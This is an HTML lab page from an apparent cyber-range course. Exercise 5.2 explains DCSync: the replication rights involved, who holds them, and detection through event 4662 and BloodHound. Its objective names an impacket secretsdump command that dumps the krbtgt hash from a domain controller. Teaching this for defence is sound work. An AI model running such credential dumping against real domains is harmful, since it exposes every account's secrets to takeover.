@@ -1,0 +1,1697 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Network forensics exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 5.2: DCSync - Network Forensics</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-52-dcsync" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Network Forensics" class="md-header__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Network Forensics
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 5.2: DCSync
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Network Forensics" class="md-nav__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Network Forensics
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N1 -- Log Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N1 -- Log Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/01_Port_Scan_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Port Scan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/02_HTTP_Traffic_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- HTTP Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/03_DNS_Anomaly_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- DNS Anomaly Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/04_Failed_Login_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- Failed Login Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/05_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N2 -- PCAP Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N2 -- PCAP Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/01_FTP_Credential_Extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- FTP Credential Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/02_SMTP_Email_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- SMTP Email Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/03_HTTP_Session_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- HTTP Session Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/04_DNS_Data_Exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- DNS Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/05_Attack_Chain_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Attack Chain Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N3 -- Firewalls
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N3 -- Firewalls
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/01_Firewall_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Firewall Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/02_Firewall_Policy_Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Firewall Policy Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dcsync-on-the-wire" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync on the Wire
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#where-dcsync-rights-come-from" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Where DCSync Rights Come From
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-the-two-extended-rights" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: The Two Extended Rights
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: The Two Extended Rights">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection-event-4662" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection: event 4662
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-secretsdump-dumps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What secretsdump dumps
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#secretsdump-targeted-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        secretsdump targeted user
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#compute-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Compute the flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-validate-the-account" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Validate the Account
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-extract-krbtgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Extract krbtgt
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-compute-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Compute the Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-note-what-else-you-could-have-dumped" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Note What Else You Could Have Dumped
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-52-dcsync">Exercise 5.2: DCSync</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Domain Controllers replicate with each other using the <strong>Directory Replication Service Remote Protocol</strong> (DRSUAPI). One side asks "send me your changes since this version"; the other side responds with the requested objects, including their secrets (NT hashes, AES keys, supplemental credentials). Any user granted the two extended rights <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> can speak this protocol; regardless of whether they are a DC. The flag combination is called "DCSync rights" and the resulting attack pattern is called DCSync.</p>
+<p>DCSync is the canonical "extract everyone's hash" technique. Domain Admins have it by default. So do <code>Enterprise Admins</code>, <code>Domain Controllers</code> (the group), and historically anyone the administrator chose to grant it to (Azure AD Connect, Microsoft Identity Manager, third-party identity sync products).</p>
+<p>Exercise 5.2 gives you an account that has DCSync rights and asks you to extract <code>krbtgt</code>.</p>
+<p><strong>Tools required:</strong> <code>impacket-secretsdump</code>. Pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "DCSync is the same protocol DCs use to replicate with each other. If a user has Replicating Directory Changes plus Replicating Directory Changes All, they speak that protocol whether they are a DC or not."</p>
+<p>The flag is <code>sha256(krbtgt_NT_hash + scope_token)</code> wrapped in <code>OCR{...}</code>.</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>svc_dcsync_&lt;token&gt;</code></td>
+<td>(per-token, see lab dashboard)</td>
+<td>Provided</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Verify the account works</li>
+<li>Run <code>secretsdump.py -just-dc-user krbtgt</code></li>
+<li>Compute <code>sha256(krbtgt_NT_hash + scope_token)</code></li>
+<li>Submit <code>OCR{&lt;sha256&gt;}</code></li>
+</ul>
+<h3 id="dcsync-on-the-wire">DCSync on the Wire</h3>
+<p>The diagram below shows what <code>secretsdump.py -just-dc-user krbtgt</code> does at the protocol level. One DRSUAPI call, one response, one hash.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    autonumber
+    participant A as Attacker (svc_dcsync)
+    participant DC as Domain Controller (corp-dc01)
+
+    A-&gt;&gt;DC: DRSUAPI bind (RPC over SMB pipe)
+    DC--&gt;&gt;A: bind ACK
+    A-&gt;&gt;DC: DRSGetNCChanges&lt;br/&gt;NCObjectGUID = krbtgt&lt;br/&gt;requested attributes = secrets
+    DC--&gt;&gt;A: NTLM hash, AES128/256 keys,&lt;br/&gt;supplemental credentials
+    Note over A: secretsdump prints the krbtgt hash&lt;br/&gt;krbtgt:502:aad3b435...:NT_HASH_HERE</code></pre>
+<h3 id="where-dcsync-rights-come-from">Where DCSync Rights Come From</h3>
+<p>The two extended rights surface on a small set of principals by design and on more principals by misconfiguration. The table below tells you who to expect on a baseline domain.</p>
+<table>
+<thead>
+<tr>
+<th>Principal</th>
+<th>Expected?</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Domain Admins</code></td>
+<td>yes</td>
+<td>Default grant on domain root</td>
+</tr>
+<tr>
+<td><code>Enterprise Admins</code></td>
+<td>yes</td>
+<td>Default grant on domain root</td>
+</tr>
+<tr>
+<td><code>BUILTIN\Administrators</code></td>
+<td>yes</td>
+<td>Default grant on domain root</td>
+</tr>
+<tr>
+<td><code>Domain Controllers</code> group</td>
+<td>yes</td>
+<td>DCs replicate with each other</td>
+</tr>
+<tr>
+<td>Azure AD / Entra Connect service account</td>
+<td>yes (if configured)</td>
+<td>Password Hash Sync requires it</td>
+</tr>
+<tr>
+<td>Microsoft Identity Manager service</td>
+<td>yes (if configured)</td>
+<td>Identity sync requires it</td>
+</tr>
+<tr>
+<td>Backup software service account</td>
+<td>usually no</td>
+<td>Almost always abuse path</td>
+</tr>
+<tr>
+<td>"Service account that needed extra rights"</td>
+<td>no</td>
+<td>Misconfiguration; treat as finding</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="background-the-two-extended-rights">Background: The Two Extended Rights</h2>
+<p>DCSync requires two rights on the domain object:</p>
+<table>
+<thead>
+<tr>
+<th>Right</th>
+<th>GUID</th>
+<th>What it allows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DS-Replication-Get-Changes</code></td>
+<td><code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code></td>
+<td>Receive replication changes (basic attributes)</td>
+</tr>
+<tr>
+<td><code>DS-Replication-Get-Changes-All</code></td>
+<td><code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code></td>
+<td>Receive replication changes including secrets</td>
+</tr>
+</tbody>
+</table>
+<p>The "All" variant is the one that exposes secrets. Without it the attacker still gets a lot, but not the hashes that make DCSync useful. With both, the attacker calls <code>DRSGetNCChanges</code> and gets every requested object's secret in the response. impacket's <code>secretsdump.py</code> automates the call and parses the response.</p>
+<p>Granted-by-default to:
+- <code>BUILTIN\Administrators</code>
+- <code>Domain Admins</code>
+- <code>Enterprise Admins</code>
+- <code>Domain Controllers</code> group</p>
+<p>Granted by intentional misconfiguration:
+- Azure AD Connect / Entra Connect (legitimate need)
+- Microsoft Identity Manager (legitimate need)
+- Backup software accounts (sometimes legitimate; usually not)
+- "Service accounts that needed extra rights" (almost always abuse path)</p>
+<p>The defender control is to enumerate every principal with these two rights and verify each one is intentional. PingCastle reports them. BloodHound shows them as <code>DCSync</code> edges. The query:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">DCSync</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">d</span><span class="p">:</span><span class="n">Domain</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">n</span>
+</code></pre></div>
+<p>The graph view renders the principal nodes that have DCSync rights; switch to the <strong>Table</strong> view tab and <code>RETURN n.name, d.name</code> for a list of principal+domain pairs.</p>
+<p>Any non-Tier-0 result is a finding.</p>
+<h3 id="detection-event-4662">Detection: event 4662</h3>
+<p>When DRSUAPI is invoked, the DC logs event 4662 (Directory Service Access) with the GUID of the right being exercised. Filter for <code>1131f6aa</code> or <code>1131f6ad</code> in event 4662; non-DC sources of those events are immediate alerts. Most SOCs do not have this rule by default; turning it on catches DCSync attacks reliably.</p>
